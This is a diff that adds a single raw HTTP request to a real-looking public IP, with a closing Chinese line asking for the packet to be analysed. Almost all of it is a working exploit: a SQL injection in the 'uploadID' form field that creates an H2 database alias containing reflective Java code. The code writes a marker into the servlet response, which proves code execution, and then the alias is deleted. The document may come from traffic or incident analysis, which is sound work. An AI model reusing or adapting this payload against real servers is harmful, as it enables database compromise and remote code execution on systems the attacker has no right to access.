@@ -1,0 +1,17 @@
+POST /client.do HTTP/1.1
+Host: 120.197.157.210:89
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/79.0
+Content-Length: 915
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryevzarhaj
+Range: bytes=0-10240
+
+------WebKitFormBoundaryevzarhaj
+Content-Disposition: form-data; name="method"
+
+getupload
+------WebKitFormBoundaryevzarhaj
+Content-Disposition: form-data; name="uploadID"
+
+1';CREATE ALIAS if not exists qryiezteou AS CONCAT('void e(String xdc) throws java.lang.Exception{Object currentRequest = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation").getMethod("getContextRequest").invoke(null);java.lang.reflect.Field _responseF = currentRequest.getClass().getSuperclass().getDeclaredField("_response");_responseF.setAccessible(true);Object response = _responseF.get(currentRequest);java.lang.reflect.Method getWriterM = response.getClass().getMethod("getWriter");java.io.Writer writer = (java.io.Writer)getWriterM.invoke(response);writer.write(xdc);}','');CALL qryiezteou('eocppndn'+'aogbhsux');DROP ALIAS qryiezteou;--
+------WebKitFormBoundaryevzarhaj--
+帮我分析一下这个数据包
